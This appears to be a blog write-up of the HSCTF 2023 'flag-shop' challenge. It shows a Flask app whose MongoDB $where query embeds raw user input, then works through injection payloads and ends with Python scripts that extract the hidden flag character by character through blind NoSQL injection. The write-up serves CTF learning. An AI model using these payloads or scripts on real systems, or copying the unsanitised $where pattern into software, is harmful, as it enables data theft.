# writeups

*June 2023 - Blind NoSQL injection*

> “hsctf pay to win confirmed?”

*Prior knowledge: basic web-related knowledge, Burpsuite*

## Context

We are provided with the link to the website and its corresponding source code.
The website appears to be very simple, and the source code is quite short:
<img class="img-responsive" src="{{ site-url }}/assets/hsctf2023/FlagShopHome.png">

Content of ```app.py```:
```python
import os
import traceback

import pymongo.errors
from flask import Flask, jsonify, render_template, request
from pymongo import MongoClient

app = Flask(__name__)
FLAG = os.getenv("FLAG")
app.config["SECRET_KEY"] = os.getenv("FLASK_SECRET")
mongo_client = MongoClient(connect=False)
db = mongo_client.database

@app.route("/")
def main():
	return render_template("index.html")

@app.route("/api/search", methods=["POST"])
def search():
	if request.json is None or "search" not in request.json:
		return jsonify({"error": "No search provided", "results": []}), 400
	try:
		results = db.flags.find(
			{
			"$where": f"this.challenge.includes('{request.json['search']}')"
			}, {
			"_id": False,
			"flag": False
			}
		).sort("challenge")
	except pymongo.errors.PyMongoError:
		traceback.print_exc()
		return jsonify({"error": "Database error", "results": []}), 500
	return jsonify({"error": "", "results": list(results)}), 200

if __name__ == "__main__":
	app.run()
```


So we know that the website uses MongoDB as its <a href="https://www.talend.com/resources/sql-vs-nosql/">(NoSQL)</a> database.

```index.html``` and ```index.css``` don't contain anything interesting, while ```index.js``` helps us understand that the buttons are useless and that ```api/search``` is the endpoint path used to make the POST request for the search.

Content of ```index.js```:
```javascript
const search_form = document.getElementById("search-form");
const search_input = document.getElementById("search");
const items = document.getElementById("items");

search_form.addEventListener("submit", function (event) {
	event.preventDefault();
	search(search_input.value);
});

async function search(val) {
	let resp = await fetch("/api/search", {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
		},
		body: JSON.stringify({ search: val }),
	});

	let { error, results } = await resp.json();

	if (error) {
		items.textContent = error;
		return;
	}

	items.innerHTML = "";
	for (let { challenge, price } of results) {
		let row = document.createElement("tr");

		let chall_cell = document.createElement("td");
		chall_cell.textContent = challenge;

		let price_cell = document.createElement("td");
		price_cell.textContent = `$${price}.00`;

		let buy_cell = document.createElement("td");
		let buy_button = document.createElement("button");
		buy_button.textContent = "Buy Flag";
		buy_button.addEventListener("click", function () {
			alert("Not implemented yet!");
		});
		buy_cell.append(buy_button);

		row.append(chall_cell, price_cell, buy_cell);
		items.append(row);
	}
}

search("");
```

Nothing that we couldn't have discovered by playing around with the website.


## Playing around
A quick analysis of the code would have been enough to understand where the vulnerability lies, but my teammate and I decided to bombard the ```search``` field. Everything seems to be working correctly, and searching with an empty ```textfield``` returns all results.

The payloads from the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadsAllTheThings</a> repository are mostly used for <a href="https://book.hacktricks.xyz/pentesting-web/login-bypass">login bypass</a>, while the <a href="https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection">SSJI</a> payloads don't seem to do anything.

When we send ```0;return true```, no result is displayed, while with ```';return 'a'=='a' && ''=='```, the previous query result remains (unexpected behavior, it should give us either a different result or an error).

Stupidly, we didn't take a look at the logs, but this is what happened if a 500 error code was obtained. Perfect! I only understood this after trying to send the payload to the ```api/search``` endpoint with <a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">Burp Repeater</a>. We now know for sure that the vulnerability lies in the definition of the query.
```python
@app.route("/api/search", methods=["POST"])
def search():
	if request.json is None or "search" not in request.json:
		return jsonify({"error": "No search provided", "results": []}), 400
	try:
		results = db.flags.find(
			{
			"$where": f"this.challenge.includes('{request.json['search']}')"
			}, {
			"_id": False,
			"flag": False
			}
		).sort("challenge")
	except pymongo.errors.PyMongoError:
		traceback.print_exc()
		return jsonify({"error": "Database error", "results": []}), 500
	return jsonify({"error": "", "results": list(results)}), 200
```

The if statement and error handling are normal. The only line to analyze is the ```$where``` clause.



## Exploiting the vulnerability (extended thought process)

The input is directly inserted with an <a href="https://www.geeksforgeeks.org/formatted-string-literals-f-strings-python/">f-string</a> with 0 sanitization. Referring to the MongoDB ```$where``` clause <a href="https://www.mongodb.com/docs/manual/reference/operator/query/where/#mongodb-query-op.-where">documentation</a>, we read:
> Use the ```$where``` operator to pass either a string containing a JavaScript expression or a full JavaScript function to the query system.

It could be intuitively understood by reading the content of ```db.flags.find()``` that the ```$where``` clause executes any JavaScript code passed to it.

At this point, I copied the JS code to a code editor. When I have challenges like this, to make things easier for me, I copy the string and try to construct a very simple payload without moving the cursor.

With ```');``` we escaped the string and closed the statement, giving us an <a href="https://portswigger.net/kb/issues/00100d00_server-side-javascript-code-injection">SSJI</a>. All that's left is to get rid of the extra ```')'``` at the end. I wasn't able to do this (and I don't think it was possible, but it certainly wasn't necessary) since I couldn't use comments. So, I went full monkey mode and just copied the previous function, forming a first test payload:

```'); this.challenge.includes('```, interpreted as ```this.challenge.includes(''); this.challenge.includes('')``` by the program. The output is what we expected and desired, which is to return all results (like a ```' OR 1=1```). 

By testing or reading the documentation, we can discover that this happens because only the last valid condition is computed by the $where clause. This means that we can write anything in the first ```include```, since it won't be interpreted (```something'); this.challenge.includes('```):

<img class="img-responsive" src="{{ site-url }}/assets/hsctf2023/burp1.png">

While the second one is interpreted (```something'); this.challenge.includes('search```):
<img class="img-responsive" src="{{ site-url }}/assets/hsctf2023/burp2.png">

So we have the vulnerability, but we cannot directly retrieve the flag since it is excluded from the query (if you're not sure, please reread the source code).
I then tried a payload with a boolean operator (```something'); always_true() || this.challenge.includes('something```):
<img class="img-responsive" src="{{ site-url }}/assets/hsctf2023/burp3.png">

This is very useful for searching for a potential attack. We can perform a conditional check on the flag using ```&& this.challenge.includes('flag')``` to only get results from the ```flag-shop``` entity. We can do a first test with the flag format (```something'); this.flag.includes('flag{') && this.challenge.includes('flag```):
<img class="img-responsive" src="{{ site-url }}/assets/hsctf2023/FirstBlind.png">
<img class="img-responsive" src="{{ site-url }}/assets/hsctf2023/BlindNotWorking.png">

We will have to take advantage of this behavior, performing a small brute force to reconstruct the flag character by character. We can now start to construct our payload.


## Final payload

### Payload used during the CTF

```python
import requests
import urllib3
import string
import urllib
import time
import json
urllib3.disable_warnings()

url = "http://flag-shop.hsctf.com/api/search"
headers={'content-type': 'application/json'}
flag = "flag{"
search = f"kj'); this.flag.includes('{flag}') && this.challenge.includes('flag"


while True:
    for c in string.printable:
        try:
            print(c)
            if c not in ['*','+','.','?','|','&','$', '"', "'", "\\", "|", "/"]:
                search = f"kj'); this.flag.includes('{flag + c}') && this.challenge.includes('flag"
                payload = '{"search": "%s"}' % (search)
                print("connecting to CTF platform...")
                r = requests.post(url, data = payload, headers=headers, timeout=10)
                #print(payload)
                result = json.loads(r.text)
                print(result["results"])
                if bool(result["results"]):
                    print("Found one more char : %s" % (flag+c))
                    flag += c
        except:
            continue
```


### Final payload

```python
import requests
import urllib3
import string
import json
urllib3.disable_warnings()

url = "http://flag-shop.hsctf.com/api/search"
headers={'content-type': 'application/json'}
flag = "flag{"
search = f"kj'); this.flag.includes('{flag}') && this.challenge.includes('flag"


while True:
    for c in string.printable:
        try:
            if c not in ['*','+','.','?','|','&','$', '"', "'", "\\", "|", "/"]:
                search = f"kj'); this.flag.includes('{flag + c}') && this.challenge.includes('flag"
                payload = '{"search": "%s"}' % (search)
                r = requests.post(url, data = payload, headers=headers, timeout=10)
                result = json.loads(r.text)

                if bool(result["results"]):
                    print("Found one more char : %s" % (flag+c))
                    flag += c
                    
        except:
            continue
```

As you can see, the only difference is that the first payload has more ```print``` statements.

This is because, due to the nature of the challenge and the fact that many others were also brute-forcing, the infrastructure became unresponsive for a few seconds, causing exceptions or blocking the request indefinitely.

The 'print' statements were only used for debugging (which is unnecessary when the infrastructure is not being bombarded), and in the second payload, I only left those related to the flag search.

```python
if c not in ['*','+','.','?','|','&','$', '"', "'", "\\", "|", "/"]
```
is used to exclude characters that can cause problems with the payload string or the server, while the ```try/except``` is used to avoid losing progress in case of an error.

It was also very useful during the competition because CTRL-C moves on to the next character instead of closing the program. 

This way, in case the program got stuck (which happened about ten times during the competition, but not at all when I tried it on the post-competition infrastructure), I would only skip one character instead of having to start over and retrieve the last characters manually.

In this case, I found a very simple blind NoSQL injection, but it is a good challenge if you are new to building custom payloads or have never encountered a blind NoSQL vulnerability before.

Thank you for reading until the end! <a href="">I am happy to accept any questions or feedback</a>.
